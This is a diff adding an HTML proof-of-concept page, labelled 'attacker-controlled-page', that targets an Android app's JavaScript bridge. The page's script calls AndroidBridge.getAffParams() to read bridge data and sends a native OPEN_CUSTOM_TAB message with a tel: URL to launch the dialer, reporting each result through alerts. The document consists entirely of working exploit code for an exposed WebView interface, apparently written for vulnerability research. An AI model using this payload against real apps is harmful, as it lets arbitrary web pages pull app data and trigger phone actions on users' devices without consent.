@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head><title>attacker-controlled-page</title></head>
+<body>
+<h1>attacker-controlled-page (no mitm)</h1>
+<script>
+(function() {
+  try {
+    var out = document.createElement('pre');
+    out.style.fontSize = '20px';
+    document.body.appendChild(out);
+    function log(s) { out.textContent += s + "\n"; alert(s); }
+
+    if (window.AndroidBridge && window.AndroidBridge.getAffParams) {
+      try {
+        var aff = window.AndroidBridge.getAffParams();
+        log("getAffParams() from attacker page (no mitm): " + aff);
+      } catch (e0) {
+        log("ERROR getAffParams: " + e0);
+      }
+      try {
+        window.AndroidBridge.sendToNative(JSON.stringify({
+          type: "OPEN_CUSTOM_TAB",
+          data: { url: "tel:0700000999" }
+        }));
+        log("Fired OPEN_CUSTOM_TAB (no mitm) - watch for Dialer.");
+      } catch (e1) {
+        log("ERROR OPEN_CUSTOM_TAB: " + e1);
+      }
+    } else {
+      log("NO AndroidBridge present on this page (origin: " + window.location.href + ")");
+    }
+  } catch (e) {
+    alert("top-level error: " + e);
+  }
+})();
+</script>
+</body>
+</html>
